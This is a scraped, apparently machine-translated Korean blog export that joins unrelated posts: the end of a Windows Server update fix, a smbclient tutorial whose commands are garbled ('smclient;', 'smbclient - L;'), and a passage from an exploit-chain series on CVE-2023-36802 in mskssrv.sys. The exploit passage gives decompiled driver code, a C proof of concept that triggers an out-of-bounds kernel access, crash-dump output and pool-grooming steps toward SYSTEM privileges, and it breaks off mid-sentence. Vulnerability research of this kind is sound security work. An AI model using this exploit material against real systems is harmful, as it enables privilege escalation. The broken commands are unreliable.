명령을 실행하세요.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n<img src=\"/assets/img/2024-05-23-Error0x80070643wheninstallingKB5034439onWindowsServer2022_14.png\" />\n\n6. To confirm that the WinRE partition is created, run `list vol`\n\n<img src=\"/assets/img/2024-05-23-Error0x80070643wheninstallingKB5034439onWindowsServer2022_15.png\" />\n\n7. To exit from diskpart, run `exit`\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n![Error Image 1](/assets/img/2024-05-23-Error0x80070643wheninstallingKB5034439onWindowsServer2022_16.png)\n\n8. To re-enable WinRE, run `reagentc /enable`\n\n![Error Image 2](/assets/img/2024-05-23-Error0x80070643wheninstallingKB5034439onWindowsServer2022_17.png)\n\n9. To confirm where WinRE is installed, run `reagentc /info`\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n<img src=\"/assets/img/2024-05-23-Error0x80070643wheninstallingKB5034439onWindowsServer2022_18.png\" />\n\n알겠어요, 프로세스가 완료되었습니다. 이제 Windows 업데이트를 다시 실행하고 성공했는지 확인해보세요.\n\n<img src=\"/assets/img/2024-05-23-Error0x80070643wheninstallingKB5034439onWindowsServer2022_19.png\" />\n\n이게 도움이 되기를 바라며, 행운을 빕니다.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n참고문헌:\n","ogImage":{"url":"/assets/img/2024-05-23-Error0x80070643wheninstallingKB5034439onWindowsServer2022_0.png"},"coverImage":"/assets/img/2024-05-23-Error0x80070643wheninstallingKB5034439onWindowsServer2022_0.png","tag":["Tech"],"readingTime":8},{"title":"Smbclient 명령어","description":"","date":"2024-05-23 15:23","slug":"2024-05-23-Smbclientcommand","content":"\n샘바 파일 서버에 연결하는 두 가지 다른 방법이 있습니다. 아래와 같습니다:\n\n터미널에서 smbclient 명령어를 사용하여 연결\n\" smb://filename \" 형식의 주소를 입력하여 파일 시스템에서 연결\n이 기사에서는 터미널에서 삼바 파일 서버에 연결하고 드라이브 트랜잭션을 수행하는 방법을 살펴보겠습니다. 시작해 봅시다 :)\n\nSmbclient은 FTP 연결과 유사한 명령 줄 도구입니다. 이 명령은 SMB 리소스에 액세스를 제공합니다. 일반적인 smbclient 명령어는 다음과 같습니다:\n\nSMB 공유 목록 열기:\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n```js\nsmbclient - L; //server_name -U users\n```\n\nSMB 공유: (비밀번호를 입력해야 함.)\n\n```js\nsmclient; //server/share -U user\n```\n\nSMB 공유에 직접 연결: (비밀번호 필요 없음, 하지만 비밀번호가 화면에 표시됨.)\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n```js\nsmclient; //server/share -U user%password\n```\n\n더 구체적인 용도를 위한 일반적인 smbclient 플래그는 아래에 나열되어 있습니다:\n\n“-L” 플래그 (— list)는 서버의 공유를 나열하는 데 사용되는 플래그입니다.\n\n“-U” 플래그 (— username [%password])는 파일 서버에 로그인할 때 사용할 사용자 이름 (및 선택적으로 암호)를 지정하는 데 사용됩니다.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n“-a” 플래그 (— authentication-file)는 연결을 설정하기 위한 사용자 비밀번호 정보를 보관하는 파일을 지정하는 데 사용하는 플래그입니다. 지정해야 하는 파일의 형식은 다음과 같아야 합니다.\n\n“-B” 플래그 (— browse): 이 플래그는 DNS를 사용하여 SMB 서버를 찾습니다.\n\n“-p” 플래그 (— port)는 연결할 포트를 선택하는 데 사용됩니다. 이 플래그를 사용하지 않으면 기본 포트는 포트 139입니다.\n\n“-I” 플래그 (— IP-address IP-address)는 연결을 위해 NetBIOS 이름이 아닌 서버의 IP 주소를 제공하는 데 사용됩니다.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n\"플래그( —— kerberos): Kerberos를 사용하여 인증을 시도하는 데 사용됩니다.\n\n디버그 수준 플래그( —— debuglevel)은 더 자세한 정보를 로그 파일에 제공합니다. 0부터 10까지의 값이 제공될 수 있습니다.\n\n또한, smbclient를 다양한 방법으로 연결할 수 있습니다. 다음과 같습니다:\n\n1. 서버 NetBIOS 이름:\n\n\\`\\`\\`js\nsmbclient -L fileserver\n\\`\\`\\`\"\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n2. 해당 서버의 IP 주소로 다음 명령어를 사용하세요:\n\n```js\nsmbclient -L x.x.x.x\n```\n\n3. 백슬래시를 사용하여 공유에 직접 링크를 하려면 다음과 같이 입력하세요:\n\n```js\nsmbclient \\\\\\\\fileserver\\\\share\n```\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n4. 위의 옵션은 따옴표를 사용하여도 수행할 수 있습니다:\n\n```js\nsmbclient \"\\\\fileserver\\share\"\n```\n","ogImage":{"url":"/assets/img/2024-05-23-Smbclientcommand_0.png"},"coverImage":"/assets/img/2024-05-23-Smbclientcommand_0.png","tag":["Tech"],"readingTime":4},{"title":"N일 연속하여 모든 것을 탈취하는 방법 파트 6 - Windows 커널 LPE SYSTEM 얻기","description":"","date":"2024-05-23 15:21","slug":"2024-05-23-ChainingN-daystoCompromiseAllPart6WindowsKernelLPEGetSYSTEM","content":"\n![이미지](/assets/img/2024-05-23-ChainingN-daystoCompromiseAllPart6WindowsKernelLPEGetSYSTEM_0.png)\n\n이 블로그 포스트는 저희가 X에서 시연한 1-day 풀 체인 익스플로잇에서 사용된 취약성에 대한 마지막 시리즈입니다. 이 블로그 포스트에서는 VMware의 제한된 권한에서 호스트 컴퓨터의 모든 권한을 얻기 위해 SYSTEM으로 권한 상승하는 방법을 소개할 것입니다. 취약성은 mskssrv.sys 드라이버에서 발생하는 CVE-2023-36802이며, 이는 이번 시리즈의 세 번째 블로그에서 다룬 CVE-2023-29360의 동일한 대상입니다.\n\n이 취약성은 실제로 악용되었으며 여러 위협 인텔리전스 그룹에 의해 감지되었습니다. IBM X-Force의 분석 보고서가 발표되었고 chompie1337의 PoC 코드가 10월에 공개된 가운데, 우리의 위협 인텔리전스 서비스인 Fermium-252는 이 취약성의 PoC와 익스플로잇을 모두 2023년 9월부터 보유하고 있습니다.\n\n# 세 번째 블로그를 상기해 보세요\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n이 취약점의 대상 드라이버는 이 시리즈의 세 번째 블로그와 동일합니다. DeviceIoControl을 통한 통신 프로세스, Ioctl 요청 처리 과정 등과 같이 중복된 내용은 건너뜁니다. 따라서 이 블로그를 시작하기 전에 CVE-2023-29360이 포함된 세 번째 블로그를 읽는 걸 강력히 권장합니다.\n\n세 번째 블로그에 설명된 대로, 사용자는 IoControlCode가 0x2F0408일 때 FSRendezvousServer::PublishTx에 접근할 수 있습니다. 이 함수는 다음과 같습니다.\n\n```js\n__int64 __fastcall FSRendezvousServer::PublishTx(FSRendezvousServer *this, struct _IRP *irp)\n{\n  ...\n  /**\n    입력 버퍼 유효성 검사\n  **/\n\n  FsContext2 = (const struct FSRegObject *)obj->FileObject->FsContext2;\n  // \"FsContext2\"를 FSRendezvousServer 개체 안에서 찾음\n  isfindobj = FSRendezvousServer::FindObject(this, FsContext2);\n  KeReleaseMutex((PRKMUTEX)((char *)this + 8), 0);\n  if (isfindobj)\n  {\n    (*(void(__fastcall **)(const struct FSRegObject *))(*(_QWORD *)FsContext2 + 0x38i64))(FsContext2); // FsStreamReg 잠금\n    // [*]. FSStreamReg::PublishTx 호출\n    result = FSStreamReg::PublishTx(FsContext2, data);\n```\n\n사용자가 제공한 값을 유효성 검사한 후, FSStreamReg::PublishTx가 FsContext2를 첫 번째 인수로 호출됩니다. 즉, FsContext2는 FSStreamReg와 관련된 유형의 개체로 추론할 수 있습니다.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\nFsContext2 값을 FSStreamReg 개체로 설정하려면 FSRendezvousServer::InitializeStream을 호출해야하며, 이 작업은 IoControlCode가 0x2F0404 일 때에만 호출될 수 있습니다.\n\n```js\n__int64 __fastcall FSRendezvousServer::InitializeStream(FSRendezvousServer *this, struct _IRP *irp)\n{\n  ...\n  // 버퍼 할당\n  buffer = (FSStreamReg *)operator new(0x1D8ui64, (enum _POOL_TYPE)irp, 0x67657253u); // FSStreamReg의 크기는 `0x1D8`입니다\n  if ( buffer )\n    FSStreamReg_obj = (volatile signed __int32 *)FSStreamReg::FSStreamReg(buffer); // FSStreamReg 설정\n  if ( !FSStreamReg_obj )\n    return 0xC000009A;\n  // FSStreamReg 초기화\n  if ( (unsigned int)Feature_Servicing_TeamsUsingMediaFoundationCrashes__private_IsEnabled() )\n    result = FSStreamReg::Initialize((FSStreamReg *)FSStreamRegObj, irp, v11, data, irp->RequestorMode);\n  else\n    result = FSStreamReg::Initialize((FSStreamReg *)FSStreamRegObj, v10, data, irp->RequestorMode);\n\n  ...\n  // FSStreamReg_obj를 FsContext2에 저장\n  obj->FileObject->FsContext2 = (PVOID)FSStreamReg_obj;\n  _InterlockedIncrement(FSStreamReg_obj + 6);\n  ...\n```\n\n# CVE-2023–36802\n\n위에서 언급한 대로, obj-`FileObject-`FsContext2가 FSStreamReg 유형으로 간주되고 있었습니다. 그러나 이 가정이 맞는 것일까요?\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\nFSRendezvousServer::FindObject 함수를 살펴보겠습니다. 이 함수는 FsContext2가 FSRendezvousServer 객체 내에 있는지 확인합니다.\n\n```js\nchar __fastcall FSRendezvousServer::FindObject(FSRendezvousServer *this, __int64 FsContext2)\n{\n  if ( FsContext2 )\n  {\n    if ( *(_DWORD *)(FsContext2 + 0x30) == 1 )\n    {\n      // Type number가 `1`인 경우\n      ...\n      while ( 1 ) // RegObjectList를 검색합니다.\n      {\n        Type1RegObj = *(_QWORD **)(this + 0x90);\n        if ( !Type1RegObj || (_QWORD *)*Type1ListHead == Type1ListHead || Type1RegObj == Type1ListHead )\n          break;\n        if ( Type1RegObj != (_QWORD *)8 && Type1RegObj[3] == FsContext2 ) // FsContext2를 찾았습니다!!!\n          return 1;\n        FSRegObjectList::MoveNext((FSRendezvousServer *)((char *)this + 0x70));\n      }\n    }\n    else\n    {\n      // Type number가 `1`이 아닌 경우\n      ...\n      while ( 1 ) // RegObjectList를 검색합니다.\n      {\n        Type2RegObj = *(_QWORD **)(this + 0x60);\n        if ( !Type2RegObj || (_QWORD *)*Type2ListHead == Type2ListHead || Type2RegObj == Type2ListHead )\n          break;\n        if ( Type2RegObj != (_QWORD *)8 && Type2RegObj[3] == FsContext2 ) // FsContext2를 찾았습니다!!!\n          return 1;\n        FSRegObjectList::MoveNext((FSRendezvousServer *)((char *)this + 0x40));\n      }\n    }\n  }\n  return 0;\n}\n```\n\nFSRendezvousServer::FindObject는 FsContext2의 0x30 오프셋에 위치한 타입 번호에 따라 두 가지 종류의 객체가 있다는 것을 명시적으로 보여줍니다. FSStreamReg::FSStreamReg에서 FSStreamReg 타입의 생성자로부터, FSStreamReg의 타입 번호를 2로 알 수 있습니다.\n\n```js\n__int64 __fastcall FSStreamReg::FSStreamReg(__int64 FSStreamReg)\n{\n  ...\n  *(_QWORD *)FSStreamReg = &FSStreamReg::`vftable';\n  *(_QWORD *)(FSStreamReg + 0x20) = FSStreamReg;\n  *(_DWORD *)(FSStreamReg + 0x30) = 2;        // 타입 == 2\n  *(_DWORD *)(FSStreamReg + 0x34) = 0x1D8;    // 크기 == 0x1D8\n  ...\n  return FSStreamReg;\n}\n```\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\nmskssrv.sys 드라이버를 분석한 후, type number가 1인 FSContextReg 객체를 찾을 수 있었습니다.\n\n```js\n__int64 __fastcall FSRendezvousServer::InitializeContext(FSRendezvousServer *this, struct _IRP *a2)\n{\n  ...\n  FSContextReg = (__int64)operator new(0x78ui64, (enum _POOL_TYPE)a2, 0x67657243u);\n  if ( FSContextReg )\n  {\n    ...\n    *(_QWORD *)FSContextReg = &FSContextReg::`vftable'; // VTable 설정\n    *(_QWORD *)(FSContextReg + 0x20) = FSContextReg;\n    *(_DWORD *)(FSContextReg + 0x30) = 1;    // Type == 1\n    *(_DWORD *)(FSContextReg + 0x34) = 0x78; // Size == 0x78\n    ...\n  }\n  ...\n  obj->FileObject->FsContext2 = (PVOID)FSContextReg;\n  ...\n}\n```\n\nFSContextReg의 크기로부터 (FSContextReg는 0x78바이트, FSStreamReg는 0x1D8바이트) FSContextReg가 FSStreamReg를 상속받지 않는다는 것을 알 수 있습니다. 자식 클래스는 부모 클래스의 모든 필드를 상속받기 때문에, 자식 클래스는 동일하거나 더 큰 크기를 가져야 합니다. 또한, FSRendezvousServer::FindObject 이후 추가 유효성 검사 루틴이 있으며, FSContextReg는 FSStreamReg::PublishTx의 첫 번째 인수로 사용될 수 있습니다. 따라서, 타입 혼란 취약점이 발생합니다.\n\n타입 혼란이 발생하면 FSStreamReg::PublishTx는 두 객체 간에 상속 관계가 없더라도 FSContextReg 객체를 FSStreamReg 타입으로 처리할 것입니다.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n```js\n__int64 __fastcall FSStreamReg::PublishTx(__int64 FsStreamReg, __int64 data)\n{\n  //\n  result = FSStreamReg::CheckRecycle(FsStreamReg, data);\n  ...\n  // 경계를 벗어난 접근\n  kEvent = *(struct _KEVENT **)(FsStreamReg + 0x130);\n  if (kEvent)\n  {\n    KeSetEvent(kEvent, 0, 0);\n    FSFrameMdlobj = 0i64;\nLABEL_21:\n    if (FSFrameMdlobj)\n    {\n      FSFrameMdl::~FSFrameMdl(FSFrameMdlobj);\n      operator delete(FSFrameMdlobj);\n    }\n  }\n  ...\n}\n\n__int64 __fastcall FSStreamReg::CheckRecycle(__int64 this, __int64 data)\n{\n  if (data)\n  {\n    value1 = *(_DWORD *)(data + 0x24);\n    if (value1)\n    {\n      ...\n      // 경계를 벗어난 접근\n      v12 = *(_QWORD *)(this + 0x1B0);\n      v13 = v5 + *(_DWORD *)(this + 0x1BC);\n      v14 = *(int *)(this + 0x1B8);\n  ...\n}\n```\n\n두 객체 간 사이즈 차이로 인해 형태 혼란이 발생하여 경계를 벗어난 접근 취약점이 발생합니다. 공격자는 이러한 기본적인 취약점을 활용하여 메모리 레이아웃을 조작하여 시스템 권한을 획들할 수 있습니다.\n\n# CVE-2023–36802의 패치\n\n```js\n-char __fastcall FSRendezvousServer::FindObject(FSRendezvousServer *this, __int64 FsContext2)\n+char __fastcall FSRendezvousServer::FindStreamObject(FSRendezvousServer *this, __int64 FsContext2)\n{\n  if (FsContext2)\n  {\n-    if (*(_DWORD *)(FsContext2 + 0x30) == 1) // 유형 1 확인\n-    {\n-      FsContextList = (_QWORD *)((char *)this + 0x80);\n-      /* FsContext2를 찾기 위한 링크드 리스트 검색 */\n-    }\n-    else\n+    if (*(_DWORD *)(FsContext2 + 0x30) == 2) // 유형 2 확인\n    {\n      FsStreamList = (_QWORD *)((char *)this + 80);\n      /* FsContext2를 찾기 위한 링크드 리스트 검색 */\n    }\n  }\n  return 0;\n}\n```\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\nFSRendezvousServer::FindObject의 이름이 FSRendezvousServer::FindStreamObject로 변경되었습니다. 이 함수는 타입 번호 2의 FSStreamReg 오브젝트를 탐색합니다.\n\n# 취약점 발생\n\n이 취약점을 발생시키기 위해서는 FSContextReg 오브젝트를 만들어야 합니다. 이 오브젝트는 FSRendezvousServer::InitializeContext에서 생성할 수 있으며, 이 함수는 IoControlCode가 0x2F0400일 때 호출됩니다.\n\n```js\n__int64 __fastcall FSInitializeContextRendezvous(struct _IRP *a1)\n{\n  ...\n  RendezvousServerObj = operator new(0xA0ui64, v3, 0x73767A52u);\n  if(RendezvousServerObj){\n    // RendezvousServerObj 초기화\n  }\n  ServerObj_1C0005048 = RendezvousServerObj_;\n  ...\n  // `FSRendezvousServer::InitializeContext`에서 FSContextReg 오브젝트 생성\n  result = FSRendezvousServer::InitializeContext(RendezvousServerObj, a1);\n  FSRendezvousServer::Release(RendezvousServerObj);\n  return result;\n}\n```\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n그러면 취약한 함수 중 하나를 트리거하여 FSRendezvousServer::PublishTx(0x2F0408), FSRendezvousServer::PublishRx(0x2F040C), FSRendezvousServer::ConsumeTx(0x2F0410), FSRendezvousServer::ConsumeRx(0x2F0414)를 실행합니다.\n\n아래 PoC는 FSStreamReg::PublishRx를 트리거하는 데 사용됩니다.\n\n```js\n#define inputsize 0x100\n#define outputsize 0x100\nint wmain(int argc, wchar_t** argv) {\n  WCHAR DeviceLink[256] = L\"\\\\\\\\?\\\\ROOT#SYSTEM#0000#{3c0d501a-140b-11d1-b40f-00a0c9223196}\\\\{96E080C7-143C-11D1-B40F-00A0C9223196}&{3C0D501A-140B-11D1-B40F-00A0C9223196}\";\n  HANDLE hDevice = NULL;\n  NTSTATUS ntstatus = 0;\n  hDevice = CreateFile(\n    DeviceLink,\n    GENERIC_READ | GENERIC_WRITE,\n    0,\n    NULL,\n    OPEN_EXISTING,\n    0x80,\n    NULL\n  );\n\n  PCHAR inputBuffer = (PCHAR)malloc(inputsize);\n  PCHAR outputBuffer = (PCHAR)malloc(outputsize);\n\n  printf(\"[+] Initialize Rendezvous\\n\");\n  memset(inputBuffer, 0, inputsize);\n  *(DWORD*)(inputBuffer + 0x00) = 0xffffffff; // &1 == Non ZERO\n  *(DWORD64*)(inputBuffer + 0x08) = GetCurrentProcessId(); // Current Process ID\n  *(DWORD64*)(inputBuffer + 0x10) = 0x4343434344444444; // Some Marker\n  *(DWORD64*)(inputBuffer + 0x18) = 0; // 0\n  ntstatus = DeviceIoControl(hDevice, 0x2F0400, inputBuffer, inputsize, outputBuffer, outputsize, NULL, NULL); // FSInitializeContextRendezvous\n\n  printf(\"[+] Publish RX --> Trigger OOB Access Vulnerability\\n\");\n  memset(inputBuffer, 0, inputsize);\n  *(DWORD*)(inputBuffer + 0x20) = 1; // maxCnt\n  *(DWORD*)(inputBuffer + 0x24) = 1; // CNT <= maxCnt\n  *(DWORD64*)(inputBuffer + 0x30) = 0; // Some Value\n  ntstatus = DeviceIoControl(hDevice, 0x2F040C, inputBuffer, inputsize, outputBuffer, outputsize, NULL, NULL); // PublishRx\n}\n```\n\nmskssrv.sys에서 verifier가 활성화되어 있는 경우 충돌이 발생할 수 있습니다.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n```js\n1: kd> r\nrax=ffffd5019f2d1668 rbx=0000000000000000 rcx=ffffbf8b77206f80\nrdx=ffffbf8b76e02b00 rsi=ffffbf8b77206f80 rdi=0000000000000000\nrip=fffff80ffac9c9f7 rsp=ffffd5019f2d1610 rbp=ffffbf8b77045e78\n r8=0000000000000001  r9=0000000000000001 r10=0000000000000000\nr11=ffffffffffffffff r12=0000000000000000 r13=ffffbf8b76d60cd0\nr14=ffffbf8b77207108 r15=ffffbf8b76e02b00\niopl=0         nv up ei pl nz na pe nc\ncs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00040202\nMSKSSRV!FSStreamReg::PublishRx+0x43:\nfffff80f`fac9c9f7 4d3936          cmp     qword ptr [r14],r14 ds:002b:ffffbf8b`77207108=????????????????\n\n1: kd> dq @rcx L18\nffffbf8b`77206f80  fffff80f`fac941b8 ffffbf8b`77204fe0\nffffbf8b`77206f90  ffffbf8b`77204fe0 00000000`00000002\nffffbf8b`77206fa0  ffffbf8b`77206f80 00000000`00000001\nffffbf8b`77206fb0  00000078`00000001 ffffbf8b`7681f300\nffffbf8b`77206fc0  00000000`00000000 ffffbf8b`77204fd0\nffffbf8b`77206fd0  00000000`00000001 00000000`00001b80\nffffbf8b`77206fe0  43434343`44444444 00000000`00000000\nffffbf8b`77206ff0  00000000`00000000 b3b3b3b3`b3b3b3b3\nffffbf8b`77207000  ????????`???????? ????????`????????\nffffbf8b`77207010  ????????`???????? ????????`????????\nffffbf8b`77207020  ????????`???????? ????????`????????\nffffbf8b`77207030  ????????`???????? ????????`????????\n\n1: kd> pr\nKDTARGET: Refreshing KD connection\n\n*** Fatal System Error: 0x00000050\n                       (0xFFFFBF8B77207108,0x0000000000000000,0xFFFFF80FFAC9C9F7,0x0000000000000002)\n\nDriver at fault:\n***   MSKSSRV.sys - Address FFFFF80FFAC9C9F7 base at FFFFF80FFAC90000, DateStamp 75a6d2bb\n.\n\nA fatal system error has occurred.\nDebugger entered on first try; Bugcheck callbacks have not been invoked.\n\nA fatal system error has occurred.\n\nrax=0000000000000000 rbx=0000000000000003 rcx=0000000000000003\nrdx=0000000000000070 rsi=0000000000000000 rdi=ffffd70001988180\nrip=fffff800470171e0 rsp=ffffd5019f2d0a28 rbp=ffffd5019f2d0b90\n r8=0000000000000065  r9=0000000000000000 r10=0000000000000000\nr11=0000000000000010 r12=0000000000000003 r13=ffffbf8b77207108\nr14=000000\n```\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\nFSStreamReg::PublishRx 함수는 적절한 FrameMDL 객체를 찾기 위해 0x188과 0x198 Offset에 접근합니다. 0x188과 0x198 오프셋은 경종 영역(out-of-bound area)에 있으므로, 제어 가능한 값을 넣을 수 있습니다. 따라서 조건을 쉽게 만족시킬 수 있고 임의의 감소 코드를 실행할 수 있습니다([*]). ObfDereferenceObject 함수는 이 위치에 있는 객체의 참조 횟수를 감소시킬 것입니다.\n\n그러나 장애물이 있었습니다. FSContextReg 객체의 크기는 풀 헤더(0x10 바이트)를 포함해 0x90 바이트이므로, LFH (Low Fragmented Heap)를 사용할 것입니다. 이는 0x90 바이트를 할당하여 메모리 레이아웃을 생성해야 함을 의미합니다. 메모리 레이아웃을 만들기 위해 네임드 파이프 객체를 사용할 수 있습니다. 네임드 파이프 객체는 NonPagedPool을 위한 취약점을 이용하기 위해 널리 사용됩니다. 왜냐하면 FSContextReg는 NonPagedPool에 할당되기 때문입니다.\n\n메모리 레이아웃이 네임드 파이프 객체에 의해 조작되면, 아래와 같이 됩니다.\n\n![이미지](/assets/img/2024-05-23-ChainingN-daystoCompromiseAllPart6WindowsKernelLPEGetSYSTEM_1.png)\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n위 그림에서와 같이 사용자가 제어할 수 없는 네임드 파이프 개체의 헤더 영역에는 오프셋 0x1C8이 있습니다. 이 문제를 해결하기 위해 이 상황에 적합한 다른 적절한 개체를 찾아보았고, ThreadName 개체를 발견했습니다.\n\n```js\nNTSTATUS __stdcall NtSetInformationThread(HANDLE ThreadHandle, THREADINFOCLASS ThreadInformationClass, PVOID ThreadInformation, ULONG ThreadInformationLength)\n{\n  ...\n  switch (ThreadInformationClass)\n    ...\n    case ThreadNameInformation:\n      if (ThreadInformationLength == 16)\n      {\n        result = ObReferenceObjectByHandleWithTag(ThreadHandle, 0x400u, (POBJECT_TYPE)PsThreadType, prev_mode, 0x79517350u, &ThreadObj, 0i64);\n        ...\n        // 사용자 주소 유효성 검사 ~~~\n        *(UNICODE_STRING *)ThreadName_Unicode = *(UNICODE_STRING *)ThreadInformation;\n        ...\n        // [1]. 임의 크기의 Non-Paged Pool 할당\n        NameMem = (char *)ExAllocatePoolWithTag(NonPagedPoolNx, ThreadName_Unicode.Length + 16i64, 0x6D4E6854u);\n        ThreadName = (_UNICODE_STRING *)NameMem;\n        if (ThreadName)\n        {\n          // [2]. 사용자 데이터 시작 위치 +0x10\n          NameArea = (wchar_t *)(NameMem + 0x10);\n          ThreadName->Buffer = NameArea;\n          ThreadName->Length = ThreadName_Unicode.Length;\n          ThreadName->MaximumLength = ThreadName_Unicode.Length;\n          // 사용자 데이터를 메모리로 복사\n          memmove(NameArea, ThreadName_Unicode.Buffer, ThreadName_Unicode.Length);\n          ...\n          OldName = ThreadObj->ThreadName;\n          ThreadObj->ThreadName = ThreadName;\n          ...\n          // 이전 이름의 메모리를 해제합니다.\n          if (OldName)\n            ExFreePoolWithTag(OldName, 0x6D4E6854u);\n          ...\n        }\n      }\n  ...\n}\n```\n\nThreadName은 ThreadNameInformation(0x26)을 사용하여 NtSetInformationThread 시스템 호출을 통해 설정할 수 있습니다. 이 개체는 원하는 크기로 NonPagedPool에 할당되며, 이 개체의 데이터는 